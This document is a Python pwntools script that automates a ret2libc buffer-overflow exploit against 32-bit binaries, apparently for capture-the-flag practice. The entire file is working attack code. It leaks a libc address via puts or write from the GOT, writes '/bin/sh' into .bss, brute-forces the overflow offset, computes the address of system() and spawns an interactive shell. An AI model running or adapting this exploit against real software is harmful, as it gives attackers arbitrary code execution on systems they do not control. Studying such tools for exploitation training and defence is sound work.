import sys
from pwn import*

binary_name = raw_input('binary name : ').rstrip('\n')
binsh = '/bin/sh\x00'
i = 0

elf_data = ELF('./'+binary_name)
rop = ROP(elf_data)
libc = elf_data.libc
bss = elf_data.bss()

try:
        puts_got = elf_data.got['puts']
        rop.puts(puts_got)
        offset = libc.symbols['puts']
        print('puts_got : ',hex(puts_got))

except:
        write_got = elf_data.got['write']
        rop.write(1,write_got,4)
        offset = libc.symbols['write']
        print('write_got : ' ,hex(write_got))
try:
        gets_got = elf_data.got['gets']
        rop.gets(bss)
        print('gets_got : ' ,hex(gets_got))
except:
        read_got = elf_data.got['read']
        rop.read(0,bss,len(binsh))
        print('read_got : ', hex(read_got))

rop.main()

recv_check = raw_input('recv str ? (yes or no) : ').rstrip('\n')

if recv_check == 'yes':

    recv_str = raw_input('recv string data : ')

    newline = raw_input('remove newline ? (yes or no) : ').rstrip('\n')

    if newline == 'yes':
        recv_str = recv_str.rstrip('\n')

while i < 10000:

        print('roop : ', i)
        context.log_level = 'debug'
        #sleep(0.1)
        p = process('./'+binary_name)
        e = ELF('./'+binary_name)

        payload = ''
        payload += 'A'*i
	payload += 'B'*4
        payload += rop.chain()

        p.sendline(payload)

        try:
                if recv_check == 'yes':
                    p.recvuntil(recv_str)
                    addr = u32(p.recv(4))
                else:
                    addr = u32(p.recv(4))

        except:
                i += 1

        else:
                if str(hex(addr))[0:4] == '0xf7':
                        print('addr : ', hex(addr))
                        base = addr - offset
                        system = base + libc.symbols['system']
                        p.send(binsh)

                        payload = ''
                        payload += 'A'*i
                        payload += 'B'*4
                        payload += p32(system)
                        payload += 'B'*4
                        payload += p32(bss)

                        p.sendline(payload)

                        p.interactive()
                        break
                else:
                        i += 1
